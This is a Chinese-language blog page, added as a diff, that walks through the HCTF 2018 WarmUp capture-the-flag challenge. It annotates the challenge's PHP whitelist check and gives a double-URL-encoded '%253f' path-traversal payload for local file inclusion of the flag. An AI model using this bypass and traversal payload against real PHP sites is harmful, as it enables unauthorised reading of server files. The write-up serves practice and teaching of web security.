@@ -1,0 +1,641 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#A9A9A9">
+  <meta name="description" content="No Security">
+  <meta name="author" content="Alone">
+  <meta name="keywords" content="">
+  
+  <title>HCTF 2018WarmUp - Alone 的博客</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"blog.nosecurity.cn","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":150,"cursorChar":"ღ ","loop":true,"backspeed":200},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":" "},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading2.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Alone</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" target="_blank" rel="noopener" href="https://www.nosecurity.cn/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                随笔
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/wendang2.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="HCTF 2018WarmUp">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      Alone
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-12-03 13:01" pubdate>
+        December 3, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      919 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      14
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HCTF 2018WarmUp</h1>
+            
+            <div class="markdown-body">
+              <p>查看源码，发现source.php访问。<br>得到代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><br> <span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>) </span><br><span class="hljs-function">        //传入了变量<span class="hljs-title">page</span>，也就是我们刚刚传进来的<span class="hljs-title">file</span></span><br><span class="hljs-function">        </span>&#123;<br>        	<span class="hljs-comment">// 这里定义了白名单</span><br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !is_string(<span class="hljs-variable">$page</span>)) &#123;<br>            <span class="hljs-comment">/*为了返回 true 两个条件必须满足</span><br><span class="hljs-comment">            	1 page存在 </span><br><span class="hljs-comment">            	2 page是字符串 ，</span><br><span class="hljs-comment">            	这里和外层的判断file 一致基本是再次判断了一遍*/</span><br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>			<span class="hljs-comment">/*in_array(search,array,type) 函数搜索数组中是否存在指定的值，</span><br><span class="hljs-comment">			白名单过滤，需要返回了ture</span><br><span class="hljs-comment">			所以这里我们传入的page或者是经过截断之后的page必须是soure.php或hint.php，</span><br><span class="hljs-comment">			这里是正常的访问，我们需要构造文件任意包含，所以这里传入的不满足条件，这里不是注意的点，往下继续看*/</span><br>            <span class="hljs-variable">$_page</span> = mb_substr( <br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>,  <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>			<span class="hljs-comment">/*这里mb_sustr 是个截断，返回0到mb_strpos之间的内容，而mb_strps 则是查找第一次出现的位置，所以基本可以理解为获取page 两个？之间的字符串，也就是获取file两个？之间的字符串，放到url中就是http://ip/?file=ddd?中的file=ddd*/</span>            <br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123; <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-comment">//这里和上面类似 查看_page 是否在白名单中</span><br>            <span class="hljs-variable">$_page</span> = urldecode(<span class="hljs-variable">$page</span>); <span class="hljs-comment">// 这里发现对_page进行了一次decode解码，</span><br>            <span class="hljs-variable">$_page</span> = mb_substr(<span class="hljs-comment">//获取两个？？之间的内容</span><br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-comment">// 这里是我们要绕过的点，从这里往上看 尝试构造</span><br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<span class="hljs-comment">//白名单</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; is_string(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::checkFile(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;<br>	<span class="hljs-comment">/*必须满足if条件，才能包含file，这里也可以猜到可能考的是文件包含： </span><br><span class="hljs-comment">		1 REQUEST[&#x27;file&#x27;]不为空 </span><br><span class="hljs-comment">		2 REQUEST[&#x27;file&#x27;]是字符串 </span><br><span class="hljs-comment">		3 checkFile($_REQUEST[&#x27;file&#x27;]) 为ture，回到checkFile 函数分析如何返回true*/</span>    <br><span class="hljs-meta">?&gt;</span><br><br>可以看到函数代码中有四个<span class="hljs-keyword">if</span>语句<br>第一个<span class="hljs-keyword">if</span>语句对变量进行检验，要求<span class="hljs-variable">$page</span>为字符串，否则返回<span class="hljs-literal">false</span><br>第二个<span class="hljs-keyword">if</span>语句判断<span class="hljs-variable">$page</span>是否存在于<span class="hljs-variable">$whitelist</span>数组中，存在则返回<span class="hljs-literal">true</span><br>第三个<span class="hljs-keyword">if</span>语句判断截取后的<span class="hljs-variable">$page</span>是否存在于<span class="hljs-variable">$whitelist</span>数组中，截取<span class="hljs-variable">$page</span>中<span class="hljs-string">&#x27;?&#x27;</span>前部分，存在则返回<span class="hljs-literal">true</span><br>第四个<span class="hljs-keyword">if</span>语句判断url解码并截取后的<span class="hljs-variable">$page</span>是否存在于<span class="hljs-variable">$whitelist</span>中，存在则返回<span class="hljs-literal">true</span><br>若以上四个<span class="hljs-keyword">if</span>语句均未返回值，则返回<span class="hljs-literal">false</span><br>有三个<span class="hljs-keyword">if</span>语句可以返回<span class="hljs-literal">true</span>，第二个语句直接判断<span class="hljs-variable">$page</span>，不可用<br>第三个语句截取<span class="hljs-string">&#x27;?&#x27;</span>前部分，由于?被后部分被解析为get方式提交的参数，也不可利用<br>第四个<span class="hljs-keyword">if</span>语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为<span class="hljs-string">&#x27;?&#x27;</span>，仍可通过第四个<span class="hljs-keyword">if</span>语句校验。（<span class="hljs-string">&#x27;?&#x27;</span>两次编码值为<span class="hljs-string">&#x27;%253f&#x27;</span>）,构造url：<br>所以我们的payload 就是<br><br>file=source.php?file=source.php%<span class="hljs-number">253</span>f../ffffllllaaaagggg构建一级目录没反应，两级也没反应，猜测可能是文件目录层级问题，继续添加../目录层级最终得到。<br>file=source.php?file=source.php%<span class="hljs-number">253</span>f../../../../../ffffllllaaaagggg<br><br></code></pre></td></tr></table></figure>
+<p>尝试访问hint.php<br><img src="https://pic.imgdb.cn/item/61aa4fda2ab3f51d91c6c6c7.jpg" srcset="/img/loading2.gif" lazyload><br>尝试构造访问，进行绕过。<br><img src="https://pic.imgdb.cn/item/61aa50132ab3f51d91c6e77b.jpg" srcset="/img/loading2.gif" lazyload></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/BUU/">BUU</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均为原创，采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/12/03/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHavefun/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">极客大挑战 2019Havefun</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/23/hello-world/">
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                <!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC81MzY3My8zMDE0Ng==">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <p>        ©2018-2022 </p> <p>  </p> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        
+      </a>
+    </span>
+    
+      
+        <span>
+          <a
+            href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
+            rel="nofollow noopener"
+            class="beian-police"
+            target="_blank"
+          >
+            
+              <span style="visibility: hidden; width: 0">|</span>
+              <img src="/img/yejiao32.png" srcset="/img/loading2.gif" lazyload alt="police-icon"/>
+            
+            <span>No Security ——Alone</span>
+          </a>
+        </span>
+      
+    
+  </div>
+
+
+  
+</footer>
+
+
+
+
+<div class="github-badge">
+  <a style="color: #fff" rel="license" href="https://hexo.io/" target="_blank" title="由 Hexo 强力驱动">
+  <span class="badge-subject">Powered</span><span class="badge-value bg-blue">Hexo</span></a>
+</div>
+<div class="github-badge">
+  <a style="color: #fff" rel="license" href="https://www.aliyun.com/" target="_blank" title="阿里云提供域名相关服务">
+  <span class="badge-subject">DNS</span><span class="badge-value bg-blueviolet">aliyun</span></a>
+</div>
+<div class="github-badge">
+  <a style="color: #fff" rel="license" href="https://www.aliyun.com/" target="_blank" title="阿里云 提供 CDN 加速服务">
+  <span class="badge-subject">CDN</span><span class="badge-value bg-orange">aliyun</span></a>
+</div>
+
+<div class="github-badge">
+  <a style="color: #fff" rel="license" href="https://996.icu/" target="_blank" title="支持 996.ICU">
+  <span class="badge-subject">Link</span><span class="badge-value bg-red">996.ICU</span></a>
+</div>
+<div class="github-badge">
+  <span class="badge-subject">UV</span><span class="badge-value bg-orange" id="busuanzi_value_site_uv"></span>
+</div>
+<div class="github-badge">
+  <span class="badge-subject">PV</span><span class="badge-value bg-brightgreen" id="busuanzi_value_site_pv"></span>
+</div>
+<div class="github-badge">
+  <span class="badge-subject">WordCount</span><span class="badge-value bg-blueviolet">7.6k</span>
+</div>
+</div>
+<style>
+  .github-badge {
+      display:inline-block;
+      border-radius:4px;
+      text-shadow:none;
+      font-size:13px;
+      color:#fff;
+      line-height:15px;
+      background-color:#ABBAC3;
+      margin-bottom:5px;
+  }
+  .github-badge .badge-subject {
+      display:inline-block;
+      background-color:#4D4D4D;
+      padding:4px 4px 4px 6px;
+      border-top-left-radius:4px;
+      border-bottom-left-radius:4px;
+  }
+  .github-badge .badge-value {
+      display:inline-block;
+      padding:4px 6px 4px 4px;
+      border-top-right-radius:4px;
+      border-bottom-right-radius:4px;
+  }
+  .github-badge .bg-brightgreen {
+      background-color:#4DC820 !important;
+  }
+  .github-badge .bg-orange {
+      background-color:#FFA500 !important;
+  }
+  .github-badge .bg-yellow {
+      background-color:#D8B024 !important;
+  }
+  .github-badge .bg-blueviolet {
+      background-color:#8833D7 !important;
+  }
+  .github-badge .bg-pink {
+      background-color:#F26BAE !important;
+  }
+  .github-badge .bg-red {
+      background-color:#e05d44 !important;
+  }
+  .github-badge .bg-blue {
+      background-color:#007EC6 !important;
+  }
+  .github-badge .bg-lightgrey {
+      background-color:#9F9F9F !important;
+  }
+  .github-badge .bg-grey, .github-badge .bg-gray {
+      background-color:#555 !important;
+  }
+  .github-badge .bg-lightgrey, .github-badge .bg-lightgray {
+      background-color:#9f9f9f !important;
+  }
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("06/01/2021 17:38:00");//在此处修改你的建站时间，格式：月/日/年 时:分:秒
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+
+<!--鼠标点击效果-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+
+<!--动态线条背景-->
+<script type="text/javascript"
+color="154 255 154" opacity='0.6' zIndex="-2" count="150" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js" >
+</script>
